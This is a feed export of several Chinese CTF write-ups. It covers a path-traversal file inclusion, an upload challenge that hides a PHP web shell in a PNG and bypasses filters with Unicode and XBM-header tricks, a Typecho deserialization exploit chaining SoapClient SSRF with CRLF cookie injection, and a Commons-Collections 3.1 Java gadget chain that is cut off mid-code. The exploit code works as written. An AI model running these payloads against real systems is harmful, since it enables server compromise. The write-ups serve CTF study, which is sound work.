class="line">[103]&#x3D;&gt;                               </span><br><span class="line">string(7) &quot;subuid-&quot;                   </span><br><span class="line">[104]&#x3D;&gt;                               </span><br><span class="line">string(11) &quot;sysctl.conf&quot;              </span><br><span class="line">[105]&#x3D;&gt;                               </span><br><span class="line">string(8) &quot;sysctl.d&quot;                  </span><br><span class="line">[106]&#x3D;&gt;                               </span><br><span class="line">string(7) &quot;systemd&quot;                   </span><br><span class="line">[107]&#x3D;&gt;                               </span><br><span class="line">string(8) &quot;terminfo&quot;                  </span><br><span class="line">[108]&#x3D;&gt;                               </span><br><span class="line">string(8) &quot;timezone&quot;                  </span><br><span class="line">[109]&#x3D;&gt;                               </span><br><span class="line">string(10) &quot;tmpfiles.d&quot;               </span><br><span class="line">[110]&#x3D;&gt;                               </span><br><span class="line">string(8) &quot;ucf.conf&quot;                  </span><br><span class="line">[111]&#x3D;&gt;                               </span><br><span class="line">string(4) &quot;udev&quot;                      </span><br><span class="line">[112]&#x3D;&gt;                               </span><br><span class="line">string(3) &quot;ufw&quot;                       </span><br><span class="line">[113]&#x3D;&gt;                               </span><br><span class="line">string(13) &quot;update-motd.d&quot;            </span><br><span class="line">[114]&#x3D;&gt;                               </span><br><span class="line">string(3) &quot;vim&quot;                       </span><br><span class="line">[115]&#x3D;&gt;                               </span><br><span class="line">string(6) &quot;wgetrc&quot;                    </span><br><span class="line">[116]&#x3D;&gt;                               </span><br><span class="line">string(3) &quot;xdg&quot;                       </span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a35a860878a.jpg"></p><p>按照顺序遍历目录，得到flag路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;fecccibbdc&#x2F;bdaaaaedef&#x2F;fcjgecchaa&#x2F;idchbadaha&#x2F;ehdchcjedh&#x2F;fl444444g</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a35a85f3221.jpg"></p><p>包含文件得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cf&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;fecccibbdc&#x2F;bdaaaaedef&#x2F;fcjgecchaa&#x2F;idchbadaha&#x2F;ehdchcjedh&#x2F;fl444444g</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a35a84d0a79.jpg"></p><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>最后一波试卷的题目，比赛的时候没做出来，在buu上进行复现</p><p>有两个页面：index.php和example.php</p><p>index.php：上传文件</p><p>example.php：解压文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这么大个的东西你是想d我吗？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;/var/www/html/image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;传都没有传上去&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解压文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//example.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))<span class="number">-1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;要不咱们再看看？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;都不能解压呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;可以解压，我想想存哪里&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以先在index.php上传一个包含php文件的zip文件，然后在example.php中解压</p><p>需要绕过两处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.getImagesize 长度和宽度stristr过滤</span><br></pre></td></tr></table></figure><p><strong>绕过getimagesize</strong></p><p>getimagesize返回数组的索引 0，1分别是宽度和高度，也就是上传图片的宽度和高度必须都为1。绕过方法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define width 1#define height 1</span><br></pre></td></tr></table></figure><p><strong>利用unicode字符绕过stristr</strong></p><p>直接上传zip文件，i会被过滤，由于使用了<code>mb_strtolower</code>处理文件名，因此可以使用unicode字符绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>var_dump(mb_strtolower(<span class="string">&#x27;İ&#x27;</span>)===<span class="string">&#x27;i&#x27;</span>);<span class="keyword">echo</span> urlencode(<span class="string">&quot;İ&quot;</span>); <span class="comment">//%C4%B0<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到两者相等</p><p><img src="https://www.hualigs.cn/image/60a35a839549a.jpg"></p><p>利用<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">隐写工具</a>生成一个包含php代码的png文件，php代码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;$_GET[0]($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a35a84bc5bd.jpg"></p><p>上传脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e0a5fbcf-c0bc-44e2-b258-a10f8553f7f3.node3.buuoj.cn/?ctf=upload&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;postedFile&#x27;</span>: <span class="string">&#x27;nginx&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">files = &#123;<span class="string">&#x27;postedFile&#x27;</span>: <span class="built_in">open</span>(<span class="string">&quot;1.zip&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, files=files,proxies=proxies)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>修改文件名中的i为unicode字符，同时添加绕过长宽限制的字符串</p><p><img src="https://www.hualigs.cn/image/60a35a849e152.jpg"></p><p>上传成功</p><p><img src="https://www.hualigs.cn/image/60a35a839f868.jpg"></p><p>在example.php解压文件</p><p><img src="https://www.hualigs.cn/image/60a35c434dd3c.jpg"></p><p>题目提示flag保存在/etc/中的多级目录下，递归访问一下即可</p><p><img src="https://www.hualigs.cn/image/60a35a83aa850.jpg"></p><p>拿到flag</p><p><img src="https://www.hualigs.cn/image/60a35a8314188.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020-EzpopRevenge</title>
    <link href="/2021/05/14/MRCTF2020-EzpopRevenge/"/>
    <url>/2021/05/14/MRCTF2020-EzpopRevenge/</url>
    
    <content type="html"><![CDATA[<p>一道挺有意思的ssrf+crlf+反序列化题</p><p>下载<a href="http://www.zip/">www.zip</a></p><p>/flag.php</p><p>看到<code>$_SERVER[&#39;REMOTE_ADDR&#39;]===&quot;127.0.0.1&quot;)</code>就知道和ssrf有关。满足条件后，flag会被保存到<code>$_SESSION[&#39;flag&#39;]</code>中</p><p><img src="https://www.hualigs.cn/image/609e4e9c185ab.jpg"></p><h1 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h1><p>/usr/plugins/HelloWorld/Plugin/Plugin.php</p><p>反序列化点，对序列化字符串进行了过滤。并且当存在<code>$_REQUEST[&#39;admin&#39;]</code>时，显示<code>$_SESSION</code></p><p><img src="https://www.hualigs.cn/image/609e4e9c78cf8.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C0incid3nc3</span><br></pre></td></tr></table></figure><p>/var/Typecho/Plugin.php</p><p><img src="https://www.hualigs.cn/image/609e4e9d5a041.jpg"></p><h1 id="反序列化SoapClient类"><a href="#反序列化SoapClient类" class="headerlink" title="反序列化SoapClient类"></a>反序列化SoapClient类</h1><p>反序列化SoapClient类并调用<code>__call</code>方法可以触发ssrf</p><p>/var/Typecho/Plugin.php</p><p>在HelloWorld_DB类的__wakeup方法中实例化了一个<code>Typecho_Db类</code></p><p><img src="https://www.hualigs.cn/image/609e4e9c9739c.jpg"></p><p>/var/Typecho/Db.php#Typecho_Db</p><p><code>Typecho_Db类</code>的构造方法，可以看到提示<code>__toString()</code>，传入参数<code>$adapterName</code>被当作字符串拼接，接下来需要找到符合条件的类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">存在__toString()</span><br><span class="line">__toString中存在可以触发SoapClient::__call的语句</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/609e4e9cc16d8.jpg"></p><p>/var/Typecho/Db/Query.php#Typecho_Db_Query</p><p><code>Typecho_Db_Query类</code>符合要求。首先满足条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;_sqlPreBuild[&#39;action&#39;]&#x3D;&#39;SELECT&#39;</span><br></pre></td></tr></table></figure><p>然后让<code>$this-&gt;_adapter</code>等于<code>SoapClient类</code>，接着调用不存在的方法<code>parseSelect</code>触发<code>__call</code>请求flag.php</p><p><img src="https://www.hualigs.cn/image/609e4e9d6fed1.jpg"></p><h1 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h1><p>由于SoapClient类无法传入Cookie参数，所以这里在user_agent这里加入换行符（\r\n）来构造出cookie参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=[<span class="string">&#x27;hello&#x27;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]=<span class="string">&#x27;SELECT&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Cookie: PHPSESSID=5j1i9n0jol3vdbpg4m3svbp3n7&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;123&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span>=&gt;str_replace(<span class="string">&quot;^^&quot;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="string">&#x27;saaaaaa^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>拿到flag</p><p><img src="https://www.hualigs.cn/image/609e4e9d64733.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化学习-CommonsCollections3.1</title>
    <link href="/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/"/>
    <url>/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/</url>
    
    <content type="html"><![CDATA[<h1 id="commons-collections-3-1"><a href="#commons-collections-3-1" class="headerlink" title="commons-collections-3.1"></a>commons-collections-3.1</h1><p>Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。</p><p>漏洞存在版本为3.1</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="poc执行过程"><a href="#poc执行过程" class="headerlink" title="poc执行过程"></a>poc执行过程</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = 